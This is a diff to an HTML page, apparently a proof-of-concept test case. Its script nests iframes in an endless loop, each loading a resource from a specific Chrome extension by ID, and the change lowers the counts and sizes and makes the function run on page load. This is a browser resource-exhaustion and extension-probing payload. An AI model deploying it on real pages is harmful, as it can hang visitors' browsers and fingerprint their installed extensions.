@@ -1,8 +1,8 @@
 <html>
   <script>
-        function create_iframes(extension) {
+        function create_iframes() {
         let iframes = []
-        let iterations = 2000000000000;
+        let iterations = 5;
         let public_url = 'chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/blocked-image-search.png';
         
         while (true) {
@@ -10,10 +10,10 @@
           document.body.append(iframe);
           iframes.push(iframe);
 
-          for (let i=0; i<2000000000000000; i++) {
+          for (let i=0; i<50; i++) {
             let subframe = document.createElement("iframe");
             subframe.src = public_url;
-            subframe.style.width = subframe.style.height = "10000000000000px";
+            subframe.style.width = subframe.style.height = "200px";
             iframe.contentDocument.body.append(subframe);
           }
 
@@ -24,5 +24,7 @@
 
           iterations++;
         }
+          
+          create_iframes()
   </script>
 </html>
